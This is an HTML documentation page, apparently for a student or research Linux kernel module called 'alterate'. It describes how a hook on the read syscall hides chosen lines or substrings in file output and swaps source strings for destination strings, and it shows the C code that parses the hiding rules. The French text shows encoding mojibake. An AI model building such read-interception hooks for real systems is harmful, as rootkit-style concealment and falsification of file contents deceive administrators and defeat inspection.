<div class="ttc" id="aalterate__api_8c_html_ade89215d4548cc5e7640d0ea38e25c83"><div class="ttname"><a href="../../d1/d5c/alterate__api_8c.html#ade89215d4548cc5e7640d0ea38e25c83">alterate_list_get</a></div><div class="ttdeci">int alterate_list_get(char *buf, size_t buf_size)</div><div class="ttdef"><b>Definition</b> <a href="../../d1/d5c/alterate__api_8c_source.html#l00096">alterate_api.c:96</a></div></div>
</div><!-- fragment --> <h4><a class="anchor" id="autotoc_md90"></a>
4.3.2 Interception</h4>
<p>Le fichier <a class="el" href="../../d9/dcc/alterate_8c.html">alterate.c</a> implÃ©mente lâ€™intÃ©gralitÃ© de la logique dâ€™interception de <code>read</code> par la fonction <a class="el" href="../../d9/dcc/alterate_8c.html#afd947c42c2ab6eb7c6ef561a1c159e22">read_hook(const struct pt_regs *regs)</a>. La fonction de hook nâ€™est ni trÃ¨s Ã©lÃ©gante ni optimisÃ©e, car le parsing rÃ©pÃ©titif de la liste introduit peut-Ãªtre une complexitÃ© inutile. </p><div class="fragment"><div class="line"><span class="keywordtype">char</span> *dup = kstrdup(rule_payload, GFP_KERNEL);</div>
<div class="line"><span class="keywordflow">if</span> (!dup)</div>
<div class="line">    <span class="keywordflow">return</span> ret;</div>
<div class="line"><span class="keywordtype">char</span> *fld[4] = { NULL, NULL, NULL, NULL };</div>
<div class="line"><span class="keywordtype">int</span> i;</div>
<div class="line"><span class="keywordflow">for</span> (i = 0; i &lt; 3; i++)</div>
<div class="line">    fld[i] = strsep(&amp;dup, <span class="stringliteral">&quot;:&quot;</span>);</div>
<div class="line">fld[3] = dup;</div>
<div class="line"> </div>
<div class="line"><span class="keywordtype">int</span> hide_line = simple_strtol(fld[0], NULL, 10);</div>
<div class="line"><span class="keywordtype">char</span> *hide_substr = fld[1][0] ? fld[1] : NULL;</div>
<div class="line"><span class="keywordtype">char</span> *src = fld[2][0] ? fld[2] : NULL;</div>
<div class="line"><span class="keywordtype">char</span> *dst = fld[3][0] ? fld[3] : NULL;</div>
</div><!-- fragment --><p><img src="../../logo_no_text.png" alt="" style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  " class="inline"/> </p>
</div></div><!-- contents -->
</div><!-- PageDoc -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
